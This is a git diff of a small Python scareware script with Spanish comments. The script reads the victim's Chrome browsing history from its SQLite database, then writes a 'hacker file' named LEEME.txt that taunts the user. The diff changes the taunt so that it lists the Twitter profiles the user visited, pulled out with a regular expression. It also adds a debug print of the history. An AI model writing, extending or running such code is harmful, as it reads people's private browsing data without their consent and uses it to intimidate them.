@@ -4,7 +4,7 @@ from pathlib import Path
 from time import sleep
 from random import randrange
 import sqlite3
-
+import re
 
 HACKERFILE_NAME = "LEEME.txt"
 
@@ -37,6 +37,7 @@ def get_chrome_history(user_path):
             urls = cursor.fetchall()
             #Cierra la conexion
             connection.close()
+            print(urls)
             return urls
         #Si el programa peta
         except sqlite3.OperationalError:
@@ -44,9 +45,13 @@ def get_chrome_history(user_path):
             sleep(3)
 
 
-def check_history_and_scare_user(hacker_file, chrome_history):
-    for item in chrome_history[:10]:
-        hacker_file.write("Ya vi que visitaste {}, ve nomas...\n".format(item[0]))
+def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
+    profiles_visited = []
+    for item in chrome_history:                 #Expresion regular
+        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
+        if results and results[0] not in ["notifications", "home"]:
+            profiles_visited.append(results[0])                                 #.join une un iterable con un caracter
+    hacker_file.write("Ya vi que andas viendo los perfiles de {}...".format(", ".join(profiles_visited)))
 
 
 
@@ -59,7 +64,7 @@ def main():
     hacker_file = create_hacker_file(user_path)
     chrome_history = get_chrome_history(user_path)
     # Escribiendo mensajes
-    check_history_and_scare_user(hacker_file, chrome_history)
+    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
 
 
 if __name__ == "__main__":
